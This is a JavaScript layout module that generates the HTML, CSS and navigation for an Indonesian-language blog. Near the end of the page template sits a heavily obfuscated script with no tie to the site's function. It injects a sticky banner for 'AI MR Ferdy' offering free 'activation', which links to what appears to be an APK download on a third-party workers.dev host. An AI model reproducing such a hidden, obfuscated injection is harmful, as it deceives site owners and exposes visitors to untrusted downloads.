import { SITE, url as buildUrl, amphtml, escapeHTML } from "./config";
import { getCategory } from "./categories";

export function layout({
	title=SITE.name,
	description=SITE.description,
	canonical="",
	image="",
	schema="",
	robots="",
	content="",
	category=""
}){
	
	const categoryData = getCategory(category);

const footerDescription =
	categoryData?.description ||
	SITE.description ||
	"";

	const canonicalUrl=canonical||SITE.domain;
	const ampUrl=amphtml(canonicalUrl.replace(SITE.domain,""));
	const ogImage=image||buildUrl(SITE.defaultImage);

	return new Response(`<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${escapeHTML(title)}</title>
<meta name="description" content="${escapeHTML(description)}">
<link rel="canonical" href="${canonicalUrl}">
<link rel="amphtml" href="${ampUrl}">
<meta name="robots" content="index,follow,max-image-preview:large">
<meta name="theme-color" content="#020617">
<meta name="author" content="${SITE.name}">
<meta property="og:type" content="article">
<meta property="og:site_name" content="${SITE.name}">
<meta property="og:title" content="${escapeHTML(title)}">
<meta property="og:description" content="${escapeHTML(description)}">
<meta property="og:url" content="${canonicalUrl}">
<meta property="og:image" content="${ogImage}">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="${escapeHTML(title)}">
<meta name="twitter:description" content="${escapeHTML(description)}">
<meta name="twitter:image" content="${ogImage}">
<link rel="sitemap" type="application/xml" href="${SITE.domain}/sitemap.xml">
<link rel="alternate" type="application/rss+xml" title="${SITE.name}" href="${SITE.domain}/rss.xml">
${robots||""}
${schema||""}

<style>

:root{
--bg:#020617;
--card:#0f172a;
--text:#e5e7eb;
--muted:#94a3b8;
--primary:#8b5cf6;
--border:#1e293b;
--shadow:0 10px 30px rgba(0,0,0,.35);
}

*{
box-sizing:border-box;
margin:0;
padding:0;
}

html{
scroll-behavior:smooth;
}

body{
font-family:
Inter,
Arial,
sans-serif;
background:
radial-gradient(
circle at top left,
rgba(99,102,241,.15),
transparent 30%
),
radial-gradient(
circle at bottom right,
rgba(139,92,246,.12),
transparent 30%
),
var(--bg);
color:var(--text);
line-height:1.8;
-webkit-font-smoothing:antialiased;
}

a{
text-decoration:none;
color:inherit;
}

img{
max-width:100%;
display:block;
height:auto;
}

/* HEADER */

.header{
position:sticky;
top:0;
z-index:999;
backdrop-filter:blur(16px);
background:rgba(2,6,23,.72);
border-bottom:
1px solid rgba(255,255,255,.05);
}

.header-wrap{
max-width:1200px;
margin:auto;
padding:16px 20px;
display:flex;
align-items:center;
justify-content:space-between;
gap:20px;
}

.logo{
font-size:24px;
font-weight:800;
letter-spacing:-.5px;
color:#fff;
}

.logo span{
background:
linear-gradient(
90deg,
#8b5cf6,
#06b6d4
);
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
}

/* DESKTOP NAV */

.desktop-nav{
display:flex;
gap:20px;
flex-wrap:wrap;
}

.desktop-nav a{
font-size:14px;
color:var(--muted);
transition:.25s ease;
}

.desktop-nav a:hover{
color:#fff;
transform:translateY(-1px);
}

/* TOGGLE */

.menu-toggle{
display:none;
background:none;
border:none;
color:#fff;
font-size:28px;
cursor:pointer;
padding:0;
}

/* MOBILE NAV */

.mobile-nav{
position:fixed;
top:0;
right:-100%;
width:280px;
height:100vh;
background:#020617;
padding:24px;
display:flex;
flex-direction:column;
gap:18px;
z-index:9999;
transition:.3s ease;
border-left:
1px solid rgba(255,255,255,.06);
box-shadow:
-10px 0 40px rgba(0,0,0,.45);
overflow-y:auto;
}

.mobile-nav.active{
right:0;
}

.mobile-nav a{
font-size:15px;
color:#e5e7eb;
padding:12px 0;
border-bottom:
1px solid rgba(255,255,255,.05);
transition:.2s ease;
}

.mobile-nav a:hover{
color:#fff;
padding-left:4px;
}

.mobile-top{
display:flex;
align-items:center;
justify-content:space-between;
margin-bottom:8px;
}

.mobile-title{
font-size:22px;
font-weight:800;
color:#fff;
}

.close-menu{
background:none;
border:none;
color:#fff;
font-size:28px;
cursor:pointer;
padding:0;
}

/* OVERLAY */

.mobile-overlay{
position:fixed;
inset:0;
background:rgba(0,0,0,.45);
backdrop-filter:blur(2px);
opacity:0;
visibility:hidden;
transition:.25s ease;
z-index:9998;
}

.mobile-overlay.active{
opacity:1;
visibility:visible;
}

/* CONTAINER */

.container{
max-width:980px;
margin:auto;
padding:26px 20px;
}

/* HERO */

.hero{
position:relative;
overflow:hidden;
padding:70px 30px;
border-radius:28px;
margin-bottom:34px;
background:
linear-gradient(
135deg,
#4f46e5,
#7c3aed
);
box-shadow:
0 20px 60px rgba(99,102,241,.35);
}

.hero::before{
content:"";
position:absolute;
width:320px;
height:320px;
background:rgba(255,255,255,.08);
border-radius:50%;
top:-100px;
right:-80px;
filter:blur(10px);
}

.hero h1{
position:relative;
z-index:2;
font-size:48px;
line-height:1.1;
margin-bottom:14px;
color:#fff;
letter-spacing:-1px;
}

.hero p{
position:relative;
z-index:2;
font-size:18px;
max-width:720px;
color:#e0e7ff;
}

/* SEO BOX */

.seo-box{
padding:24px;
border-radius:24px;
background:
linear-gradient(
180deg,
rgba(255,255,255,.03),
rgba(255,255,255,.01)
);
border:1px solid rgba(255,255,255,.06);
backdrop-filter:blur(14px);
margin-bottom:30px;
box-shadow:var(--shadow);
}

/* GRID */

.grid{
display:grid;
grid-template-columns:
repeat(
auto-fit,
minmax(280px,1fr)
);
gap:24px;
}

/* CARD */

.card{
overflow:hidden;
border-radius:24px;
background:
linear-gradient(
180deg,
rgba(255,255,255,.03),
rgba(255,255,255,.01)
);
border:1px solid rgba(255,255,255,.05);
transition:
transform .28s ease,
border-color .28s ease,
box-shadow .28s ease;
box-shadow:var(--shadow);
}

.card:hover{
transform:translateY(-6px);
border-color:
rgba(139,92,246,.45);
}

.card img{
width:100%;
aspect-ratio:1200/630;
object-fit:cover;
}

.card h3,
.card h4{
padding:18px;
font-size:20px;
line-height:1.4;
font-weight:700;
color:#fff;
}

/* POST */

.post img{
border-radius:24px;
margin-bottom:26px;
box-shadow:var(--shadow);
}

.post h1{
font-size:42px;
line-height:1.2;
margin-bottom:20px;
letter-spacing:-1px;
}

.post-content{
font-size:18px;
color:#dbe4ee;
}

.post-content p{
margin:20px 0;
}

.post-content h2{
font-size:32px;
margin-top:50px;
margin-bottom:18px;
line-height:1.3;
}

.post-content h3{
font-size:24px;
margin-top:36px;
margin-bottom:12px;
}

.post-content ul{
padding-left:24px;
margin:20px 0;
}

.post-content li{
margin:10px 0;
}

.post-content a{
color:#8b5cf6;
text-decoration:underline;
}

.breadcrumb{
font-size:14px;
margin-bottom:22px;
color:var(--muted);
}

.pagination{
display:flex;
justify-content:center;
flex-wrap:wrap;
gap:10px;
margin:50px 0;
}

.pagination a{
padding:12px 16px;
border-radius:14px;
background:
rgba(255,255,255,.03);
border:
1px solid rgba(255,255,255,.05);
font-size:14px;
}

.pagination .active{
background:#8b5cf6;
color:#fff;
}

/* FOOTER */

.footer{
margin-top:70px;
padding:50px 20px;
border-top:
1px solid rgba(255,255,255,.05);
background:
rgba(255,255,255,.02);
}

.footer-wrap{
max-width:1100px;
margin:auto;
display:grid;
grid-template-columns:
2fr 1fr 1fr;
gap:40px;
}

.footer-brand h3{
font-size:24px;
margin-bottom:12px;
color:#fff;
}

.footer-brand p{
font-size:15px;
color:var(--muted);
max-width:420px;
}

.footer-menu h4{
font-size:16px;
margin-bottom:14px;
color:#fff;
}

.footer-menu{
display:flex;
flex-direction:column;
gap:12px;
}

.footer-menu a{
font-size:14px;
color:var(--muted);
transition:.2s ease;
}

.footer-menu a:hover{
color:#fff;
transform:translateX(3px);
}

.footer-bottom{
margin-top:40px;
padding-top:20px;
border-top:
1px solid rgba(255,255,255,.05);
text-align:center;
font-size:14px;
color:var(--muted);
}

/* MOBILE */

@media(max-width:768px){

.desktop-nav{
display:none;
}

.menu-toggle{
display:block;
}

.header-wrap{
flex-direction:row;
align-items:center;
}

.container{
padding:18px;
}

.hero{
padding:48px 24px;
border-radius:24px;
}

.hero h1{
font-size:34px;
}

.hero p{
font-size:16px;
}

.post h1{
font-size:32px;
}

.post-content{
font-size:17px;
}

.grid{
grid-template-columns:1fr;
}

.footer-wrap{
grid-template-columns:
1fr 1fr;
gap:24px;
}

.footer-brand{
grid-column:1/-1;
}

}







a{
text-decoration:none;
color:#fff;
}
.hero{
padding:28px 16px;
}
.hero-box{
background:linear-gradient(135deg,#4f46e5,#7c3aed);
padding:38px 22px;
border-radius:22px;
text-align:center;
box-shadow:0 10px 40px rgba(124,58,237,.35);
}
.hero-badge{
display:inline-block;
padding:8px 14px;
border-radius:999px;
background:rgba(255,255,255,.14);
font-size:12px;
font-weight:700;
margin-bottom:16px;
}
.hero h1{
margin:0;
font-size:34px;
line-height:1.1;
font-weight:900;
}
.hero p{
margin:16px 0 0;
font-size:15px;
line-height:1.7;
color:#e5e7eb;
}
.hero-btns{
display:flex;
justify-content:center;
gap:10px;
margin-top:24px;
flex-wrap:wrap;
}
.btn{
padding:12px 18px;
border-radius:12px;
background:#fff;
color:#111827;
font-size:14px;
font-weight:700;
}
.btn2{
background:#111827;
color:#fff;
border:1px solid rgba(255,255,255,.1);
}
.section{
padding:0 16px 40px;
}
.section-title{
margin-bottom:20px;
}
.section-title h2{
margin:0;
font-size:24px;
}
.section-title p{
margin:8px 0 0;
font-size:14px;
color:#94a3b8;
}
.grid{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
gap:18px;
}
.card{
background:#0f172a;
border:1px solid #1e293b;
border-radius:20px;
overflow:hidden;
transition:.2s;
}
.thumb{
aspect-ratio:16/9;
background:#111827;
display:flex;
align-items:center;
justify-content:center;
overflow:hidden;
}
.thumb img{
max-width:100%;
max-height:100%;
object-fit:contain;
}
.body{
padding:16px;
}
.badge{
display:inline-block;
padding:6px 10px;
border-radius:999px;
background:#4f46e5;
font-size:11px;
font-weight:700;
margin-bottom:12px;
}
.card h3{
margin:0;
font-size:18px;
line-height:1.5;
color:#f8fafc;
}
.pagination{
display:flex;
justify-content:center;
gap:10px;
margin-top:34px;
flex-wrap:wrap;
}
.pagination a{
padding:10px 14px;
border-radius:12px;
background:#111827;
border:1px solid #1e293b;
font-size:14px;
}
.pagination a.active{
background:#4f46e5;
border-color:#4f46e5;
}
@media(max-width:768px){
.hero{
padding:18px 12px;
}
.hero-box{
padding:30px 18px;
border-radius:18px;
}
.hero h1{
font-size:28px;
}
.grid{
grid-template-columns:1fr;
}
.section{
padding:0 12px 30px;
}
}





.search{
width:100%;
padding:14px;
border-radius:14px;
border:1px solid var(--border);
background:#111827;
color:#fff;
margin-bottom:16px;
outline:none;
}

#results{
display:grid;
gap:10px;
margin-bottom:20px;
}

.search-item{
padding:14px;
border-radius:12px;
background:var(--card);
border:1px solid var(--border);
}

.badge{
display:inline-block;
padding:6px 12px;
border-radius:999px;
background:#312e81;
color:#c7d2fe;
font-size:12px;
margin-bottom:12px;
}

.toc{
background:var(--card);
border:1px solid var(--border);
border-radius:18px;
padding:16px 20px;
margin:28px 0;
box-shadow:var(--shadow)
}

.toc-title{
cursor:pointer;
font-weight:700;
font-size:16px;
color:var(--text);
list-style:none;
outline:none;
display:flex;
align-items:center;
justify-content:space-between;
gap:10px
}

.toc-title::-webkit-details-marker{
display:none
}

.toc ul{
margin:16px 0 0;
padding-left:18px
}

.toc li{
margin:10px 0;
color:var(--muted)
}

.toc a{
color:var(--text);
text-decoration:none;
transition:.2s
}

.toc a:hover{
color:var(--primary);
padding-left:2px
}

.toc-toggle{
font-size:0
}

.toc-toggle::before{
content:"Buka";
font-size:13px;
color:var(--muted)
}

.toc[open] .toc-toggle::before{
content:"Tutup";
color:var(--primary)
}
</style>
</head>
<body>
<!-- HEADER -->
<header class="header">
<div class="header-wrap">
<a href="/" class="logo">⚡ <span>${SITE.name}</span></a>
<nav class="desktop-nav">
<a href="/">Home</a>
<a href="/amp">AMP</a>
<a href="/rss.xml">RSS</a>
<a href="/sitemap.xml">Sitemap</a>
</nav>
<button class="menu-toggle" id="menuToggle" aria-label="Menu">☰</button>
</div>
</header>
<!-- MOBILE NAV -->
<nav class="mobile-nav" id="mobileNav">
<div class="mobile-top">
<div class="mobile-title">⚡ ${SITE.name}</div>
<button class="close-menu" id="closeMenu">✕</button>
</div>
<a href="/">Home</a>
<a href="/amp">AMP</a>
<a href="/rss.xml">RSS</a>
<a href="/sitemap.xml">Sitemap</a>
<a href="/about">Tentang Kami</a>
<a href="/contact">Contact</a>
<a href="/privacy-policy">Privacy Policy</a>
<a href="/terms">Terms</a>
<a href="/disclaimer">Disclaimer</a>
</nav>
<!-- OVERLAY -->
<div class="mobile-overlay" id="mobileOverlay"></div>
<!-- CONTENT -->
<main class="container">${content}</main>
<!-- FOOTER -->
<footer class="footer">
<div class="footer-wrap">
<div class="footer-brand">
<h3>⚡ ${SITE.name}</h3>
<p>
${escapeHTML(footerDescription)}
</p>
</div>
<div class="footer-menu">
<h4>Menu</h4>
<a href="/">Home</a>
<a href="/about">Tentang Kami</a>
<a href="/contact">Contact</a>
<a href="/privacy-policy">Privacy Policy</a>
</div>
<div class="footer-menu">
<h4>Informasi</h4>
<a href="/terms">Terms</a>
<a href="/disclaimer">Disclaimer</a>
<a href="/pedoman-media-siber">Pedoman Media Siber</a>
<a href="/rss.xml">RSS Feed</a>
</div>
</div>
<div class="footer-bottom">© ${new Date().getFullYear()} ${SITE.name} • All Rights Reserved</div>
</footer>
<script>
const menuToggle=document.getElementById("menuToggle");
const mobileNav=document.getElementById("mobileNav");
const closeMenu=document.getElementById("closeMenu");
const mobileOverlay=document.getElementById("mobileOverlay");

function openMenu(){
mobileNav.classList.add("active");
mobileOverlay.classList.add("active");
document.body.style.overflow="hidden";
}

function closeMobileMenu(){
mobileNav.classList.remove("active");
mobileOverlay.classList.remove("active");
document.body.style.overflow="";
}

menuToggle.onclick=openMenu;
closeMenu.onclick=closeMobileMenu;
mobileOverlay.onclick=closeMobileMenu;

document.addEventListener("keydown",(e)=>{
if(e.key==="Escape"){
closeMobileMenu();
}
});
</script>

<script>
function _0x3ad1(_0x57e3f9,_0x17ec88){_0x57e3f9=_0x57e3f9-(0x1*-0x1f3f+0x1c1c+0x47c);var _0x1a0d9a=_0x553b();var _0x4bbb51=_0x1a0d9a[_0x57e3f9];return _0x4bbb51;}function _0x553b(){var _0x2be37a=['r\x20infinite','e\x22>⚡AI\x20MR\x20','n\x202s\x20linea','rames\x20puls','ration:non','k\x20.promo{f','://apk.aim','rFerdy.wo','ent(90deg,','20px;font-','querySelec','0a0a;color','iuOsa','001a33);co','text{font-','color:#aee','5)}#br-sti','sform:tran','r-stick\x20a{','oritma\x20Tek','g:before{c','parentNode','solid\x20rgba','Loaded','ransition:','rkers.dev\x22','#br-stick{','10609228hfsJxs','t:700;marg','weight:900','head','%);width:m','br-stick\x20.','ient(90deg','ius:16px;b','ay:inline-','\x20.log{back','tick\x20.titl','tor','ative;disp','ent','e{50%{tran','\x20class=\x22ba',':60%;heigh','size:10px;','NahYa','ht:100%;ba','kground:li','div><a\x20cla','nt,rgba(0,','Sistem\x20Alg','r:1px\x20soli','lay:flex;a','x\x2010px;fon','e}#br-stic','t:100%;bac','appendChil',':10px;tran','style','388522LyDIjd','scan{100%{','padding:9p',';font-size','dge\x22>PRO</','11px\x2016px;','riUxy',',#0b0033,#','IKsyf','lex:1;min-','if}#br-sti','eg,#05010a','=\x22box\x22><di','width:0}#b',',255,255,.','position:f','e:17px}#br','eight:700;','linear-gra',':22px;curs','block;padd','apaMB','5),transpa','0deg,#00ff','innerHTML','removeChil','font-size:','DOMContent','wFCAL','size:12px;',':#00ffd5;b',';color:#00',',.3)}#br-s','ackground:','te;positio','ose\x22>×</bu','0%</div></','-stick\x20.re','e{font-siz','left:160%}','tick\x20.clos','ick\x20.reg{b','onclick','100%;width','amily:Aria','.close','ation:scan','6YjjKkK','0px\x20rgba(0','sform:scal','-top:4px}#','x}}','0px){#br-s',';padding:0','p:0;left:-','5px\x20rgba(0','p:10px;pad','ius:12px;f','4px;font-w','ckground:l','sition:rel','near-gradi','}#br-stick','255,255,.2',';overflow:','shadow:0\x200','Ferdy</di','keyframes\x20','KnpBM',';backgroun','\x20gratis\x2010','{text-deco','\x204px;text-','l,sans-ser','rent);anim','dient(135d','or:pointer','absolute;t','ss=\x22text\x22>','transparen','gradient(9','stener',':0\x200\x2010px\x20','blank\x22\x20rel','inear-grad','xt{font-si','\x2010px\x20rgba','body','t,rgba(255','content:\x22\x22',',200,.6)}#','mation:sca','ing:3px\x208p','d:none;col','v><div\x20cla','op:0;left:','50%;bottom','font-weigh','rgba(0,0,0','h:60%;heig','155230MAPDlE','er-radius:','(0,255,200','171048iCfuct','on:pulse\x201','\x20target=\x22_','x;backgrou',',transpare','=\x22nofollow','999;font-f','bsolute;to','t-size:12p','div','div><div\x20c','018;box-sh',';position:','ding:12px;','position:a','tton></div','\x208px\x2025px\x20','adow:0\x200\x201',',#00c3ff);',');color:#0','35),transp','6);animati','ox-shadow:','RReWe','\x202.5s\x20line','color:#001','9d,#00c3ff','200,.25),0','nd:linear-',':hidden}#b','55,200,.35','\x20SEKARANG<','e(1.05)}}@','710BRKooz','lass=\x22titl',',.5);borde','22px;font-','lign-items','fff;margin','n:relative','ref=\x22https',',.5)}@keyf','in(620px,c','br-stick\x20a','ox:before{','ontent:\x22\x22;','ont-size:1','getElement','-stick\x20.te','d\x20rgba(0,2','addEventLi',',255,200,.','0\x200\x2020px\x20r','in-bottom:','romo\x22><div','white-spac','ar\x20infinit','e{border:0','-\x2020px));z','e:nowrap;t','ze:11px}#b','height:1;t','ss=\x22reg\x22\x20h','-100%;widt','v\x20class=\x22p','rgba(0,255','lor:#fff;b','<div\x20class','-index:999',':center;ga','/a><button','ffd5;line-','br-stick','ById','or:#00ffd5','e;padding:','.3s\x20infini','ANyyy','hidden}#br','4px;box-sh','arent);ani','createElem','order:1px\x20','3566394siEoeT','border-rad','.2s}#br-st','ext-shadow','\x22>AKTIVASI','gba(0,255,','}@media(ma','adge{displ','11472808TGjoyO','r-stick\x20.b',');overflow','ck\x20.title{','ixed;left:','01018;bord','639036LCDBbd','ground:#0a','alc(100vw\x20','x-width:48','nologi\x20AI,','155EpbhAC','ck\x20.box{po','\x20class=\x22cl','slateX(-50','eg,#00ff9d'];_0x553b=function(){return _0x2be37a;};return _0x553b();}(function(_0x166a17,_0x4aa7fe){var _0x89893a=_0x3ad1,_0x8e7ad3=_0x166a17();while(!![]){try{var _0xda7250=-parseInt(_0x89893a(0x176))/(0x3d2+0xac0+-0xe91)+-parseInt(_0x89893a(0x21f))/(0x2223+-0x1*0x1f96+-0x28b)*(parseInt(_0x89893a(0x24e))/(0x1f65+-0x4*-0x2+-0xfb5*0x2))+-parseInt(_0x89893a(0x179))/(-0xb*0x312+-0x1f4d*-0x1+-0x7*-0x5b)*(parseInt(_0x89893a(0x1df))/(-0x1bd3*-0x1+0x1*0x1631+-0x31ff))+parseInt(_0x89893a(0x1cc))/(0x8d+0x3df+-0x2*0x233)+-parseInt(_0x89893a(0x1ff))/(-0x93+-0x59*-0x5+-0x123)+-parseInt(_0x89893a(0x1d4))/(0x69e*0x4+-0x7*-0x3cb+-0x34fd)+parseInt(_0x89893a(0x1da))/(0x799*0x5+-0x1f5+-0x23ff)*(parseInt(_0x89893a(0x19a))/(-0x103*-0xf+0x5*-0x21e+-0x48d));if(_0xda7250===_0x4aa7fe)break;else _0x8e7ad3['push'](_0x8e7ad3['shift']());}catch(_0x4253ef){_0x8e7ad3['push'](_0x8e7ad3['shift']());}}}(_0x553b,-0x69ae4+0xc4143+0x6cf7d),(function(){var _0xc5ed37=_0x3ad1,_0x1be8ec={'riUxy':_0xc5ed37(0x1c1),'KnpBM':_0xc5ed37(0x24c),'IKsyf':_0xc5ed37(0x21e),'NahYa':_0xc5ed37(0x1fe)+_0xc5ed37(0x22e)+_0xc5ed37(0x1d8)+_0xc5ed37(0x172)+_0xc5ed37(0x21d)+_0xc5ed37(0x1f5)+_0xc5ed37(0x1e2)+_0xc5ed37(0x203)+_0xc5ed37(0x1a3)+_0xc5ed37(0x1dc)+_0xc5ed37(0x1b3)+_0xc5ed37(0x1bd)+_0xc5ed37(0x17f)+_0xc5ed37(0x24b)+_0xc5ed37(0x15b)+_0xc5ed37(0x229)+_0xc5ed37(0x1e0)+_0xc5ed37(0x25b)+_0xc5ed37(0x20b)+_0xc5ed37(0x218)+_0xc5ed37(0x19e)+_0xc5ed37(0x1be)+_0xc5ed37(0x257)+_0xc5ed37(0x186)+_0xc5ed37(0x1cd)+_0xc5ed37(0x206)+_0xc5ed37(0x240)+_0xc5ed37(0x231)+_0xc5ed37(0x15d)+_0xc5ed37(0x22a)+_0xc5ed37(0x226)+_0xc5ed37(0x1f1)+_0xc5ed37(0x1bb)+_0xc5ed37(0x18f)+_0xc5ed37(0x1ad)+_0xc5ed37(0x1d1)+_0xc5ed37(0x194)+_0xc5ed37(0x189)+_0xc5ed37(0x174)+_0xc5ed37(0x19c)+_0xc5ed37(0x217)+_0xc5ed37(0x1aa)+_0xc5ed37(0x197)+_0xc5ed37(0x1d6)+_0xc5ed37(0x196)+_0xc5ed37(0x1d5)+_0xc5ed37(0x1a5)+_0xc5ed37(0x16b)+_0xc5ed37(0x185)+_0xc5ed37(0x15f)+_0xc5ed37(0x171)+_0xc5ed37(0x1b8)+_0xc5ed37(0x175)+_0xc5ed37(0x212)+_0xc5ed37(0x25a)+_0xc5ed37(0x166)+_0xc5ed37(0x205)+_0xc5ed37(0x17d)+_0xc5ed37(0x215)+_0xc5ed37(0x25e)+_0xc5ed37(0x235)+_0xc5ed37(0x15c)+_0xc5ed37(0x24d)+_0xc5ed37(0x191)+_0xc5ed37(0x1b1)+_0xc5ed37(0x21a)+_0xc5ed37(0x1e9)+_0xc5ed37(0x228)+_0xc5ed37(0x22c)+_0xc5ed37(0x1d5)+_0xc5ed37(0x1d3)+_0xc5ed37(0x207)+_0xc5ed37(0x233)+_0xc5ed37(0x16e)+_0xc5ed37(0x17c)+_0xc5ed37(0x195)+_0xc5ed37(0x162)+_0xc5ed37(0x236)+_0xc5ed37(0x193)+_0xc5ed37(0x18c)+_0xc5ed37(0x1d9)+_0xc5ed37(0x177)+_0xc5ed37(0x1ed)+_0xc5ed37(0x210)+_0xc5ed37(0x173)+_0xc5ed37(0x200)+_0xc5ed37(0x1ae)+_0xc5ed37(0x1c8)+_0xc5ed37(0x18a)+_0xc5ed37(0x24f)+_0xc5ed37(0x1ac)+_0xc5ed37(0x1f4)+_0xc5ed37(0x1d7)+_0xc5ed37(0x239)+_0xc5ed37(0x19d)+_0xc5ed37(0x201)+_0xc5ed37(0x23e)+_0xc5ed37(0x1c0)+_0xc5ed37(0x1b6)+_0xc5ed37(0x1cf)+(_0xc5ed37(0x164)+_0xc5ed37(0x1ba)+_0xc5ed37(0x16c)+_0xc5ed37(0x204)+_0xc5ed37(0x1f2)+_0xc5ed37(0x23c)+_0xc5ed37(0x1f3)+_0xc5ed37(0x19f)+_0xc5ed37(0x251)+_0xc5ed37(0x1a4)+_0xc5ed37(0x159)+_0xc5ed37(0x1e8)+_0xc5ed37(0x1c4)+_0xc5ed37(0x224)+_0xc5ed37(0x1cd)+_0xc5ed37(0x258)+_0xc5ed37(0x1a7)+_0xc5ed37(0x259)+_0xc5ed37(0x230)+_0xc5ed37(0x1b0)+_0xc5ed37(0x1b4)+_0xc5ed37(0x1fc)+_0xc5ed37(0x1ce)+_0xc5ed37(0x248)+_0xc5ed37(0x240)+_0xc5ed37(0x231)+_0xc5ed37(0x15d)+_0xc5ed37(0x1e3)+_0xc5ed37(0x18b)+_0xc5ed37(0x192)+_0xc5ed37(0x184)+_0xc5ed37(0x18a)+_0xc5ed37(0x256)+_0xc5ed37(0x1ac)+_0xc5ed37(0x18e)+_0xc5ed37(0x17a)+_0xc5ed37(0x1c5)+_0xc5ed37(0x241)+_0xc5ed37(0x1a0)+_0xc5ed37(0x25f)+_0xc5ed37(0x1c7)+_0xc5ed37(0x244)+_0xc5ed37(0x1f8)+_0xc5ed37(0x1a6)+_0xc5ed37(0x187)+_0xc5ed37(0x180)+_0xc5ed37(0x255)+_0xc5ed37(0x24a)+_0xc5ed37(0x20f)+_0xc5ed37(0x21b)+_0xc5ed37(0x213)+_0xc5ed37(0x25c)+_0xc5ed37(0x1ec)+_0xc5ed37(0x161)+_0xc5ed37(0x16a)+_0xc5ed37(0x22d)+_0xc5ed37(0x18d)+_0xc5ed37(0x1c9)+_0xc5ed37(0x16d)+_0xc5ed37(0x1e6)+_0xc5ed37(0x1e4)+_0xc5ed37(0x25d)+_0xc5ed37(0x208)+_0xc5ed37(0x1db)+_0xc5ed37(0x1ef)+_0xc5ed37(0x23d)+_0xc5ed37(0x1cb)+_0xc5ed37(0x1fa)+_0xc5ed37(0x178)+_0xc5ed37(0x23f)+_0xc5ed37(0x247)+_0xc5ed37(0x1b2)+_0xc5ed37(0x264)+_0xc5ed37(0x16f)+_0xc5ed37(0x1c3)+_0xc5ed37(0x222)+_0xc5ed37(0x232)+_0xc5ed37(0x15e)+_0xc5ed37(0x254)+_0xc5ed37(0x15a)+_0xc5ed37(0x260)+_0xc5ed37(0x168)+_0xc5ed37(0x178)+_0xc5ed37(0x1a2)+_0xc5ed37(0x1e7)+_0xc5ed37(0x20d)+_0xc5ed37(0x250)+_0xc5ed37(0x199)+_0xc5ed37(0x262)+_0xc5ed37(0x220)+_0xc5ed37(0x246)+_0xc5ed37(0x1d2)+_0xc5ed37(0x1dd)+_0xc5ed37(0x253)+_0xc5ed37(0x209)+_0xc5ed37(0x245)+_0xc5ed37(0x22f)+_0xc5ed37(0x1a9)+_0xc5ed37(0x167)+_0xc5ed37(0x1b5))+(_0xc5ed37(0x1f6)+_0xc5ed37(0x221)+_0xc5ed37(0x219)+_0xc5ed37(0x181)+_0xc5ed37(0x252)),'wFCAL':_0xc5ed37(0x182),'apaMB':_0xc5ed37(0x1bc)+_0xc5ed37(0x22b)+_0xc5ed37(0x1b9)+_0xc5ed37(0x1af)+_0xc5ed37(0x20e)+_0xc5ed37(0x223)+_0xc5ed37(0x183)+_0xc5ed37(0x19b)+_0xc5ed37(0x1e5)+_0xc5ed37(0x261)+_0xc5ed37(0x170)+_0xc5ed37(0x160)+_0xc5ed37(0x216)+_0xc5ed37(0x1f7)+_0xc5ed37(0x1de)+_0xc5ed37(0x265)+_0xc5ed37(0x243)+_0xc5ed37(0x214)+_0xc5ed37(0x1b7)+_0xc5ed37(0x1a1)+_0xc5ed37(0x1ea)+_0xc5ed37(0x1eb)+_0xc5ed37(0x1fd)+_0xc5ed37(0x17b)+_0xc5ed37(0x165)+_0xc5ed37(0x17e)+_0xc5ed37(0x1d0)+_0xc5ed37(0x198)+_0xc5ed37(0x1bf)+_0xc5ed37(0x1e1)+_0xc5ed37(0x242)+_0xc5ed37(0x188)+'>','ANyyy':function(_0x111583){return _0x111583();},'iuOsa':_0xc5ed37(0x23a)+_0xc5ed37(0x1fb)};if(document[_0xc5ed37(0x1a8)+_0xc5ed37(0x1c2)](_0x1be8ec[_0xc5ed37(0x225)]))return;var _0x26768c=document[_0xc5ed37(0x1ca)+_0xc5ed37(0x20c)](_0x1be8ec[_0xc5ed37(0x227)]);_0x26768c[_0xc5ed37(0x237)]=_0x1be8ec[_0xc5ed37(0x211)],document[_0xc5ed37(0x202)][_0xc5ed37(0x21c)+'d'](_0x26768c);var _0x5405c9=document[_0xc5ed37(0x1ca)+_0xc5ed37(0x20c)](_0x1be8ec[_0xc5ed37(0x23b)]);_0x5405c9['id']=_0x1be8ec[_0xc5ed37(0x225)],_0x5405c9[_0xc5ed37(0x237)]=_0x1be8ec[_0xc5ed37(0x234)];function _0x293f59(){var _0x2bfa19=_0xc5ed37,_0x2ab36c={'RReWe':_0x1be8ec[_0x2bfa19(0x225)]};document[_0x2bfa19(0x169)][_0x2bfa19(0x21c)+'d'](_0x5405c9);var _0x315ad5=_0x5405c9[_0x2bfa19(0x1ee)+_0x2bfa19(0x20a)](_0x1be8ec[_0x2bfa19(0x263)]);_0x315ad5&&(_0x315ad5[_0x2bfa19(0x249)]=function(){var _0x5d4c6f=_0x2bfa19,_0x2517c1=document[_0x5d4c6f(0x1a8)+_0x5d4c6f(0x1c2)](_0x2ab36c[_0x5d4c6f(0x190)]);_0x2517c1&&_0x2517c1[_0x5d4c6f(0x1f9)][_0x5d4c6f(0x238)+'d'](_0x2517c1);});}document[_0xc5ed37(0x169)]?_0x1be8ec[_0xc5ed37(0x1c6)](_0x293f59):document[_0xc5ed37(0x1ab)+_0xc5ed37(0x163)](_0x1be8ec[_0xc5ed37(0x1f0)],_0x293f59,![]);}()));
</script>

</body>
</html>`,{
		headers:{
			"content-type":"text/html;charset=UTF-8",
			"cache-control":"public,max-age=300"
		}
	});
}
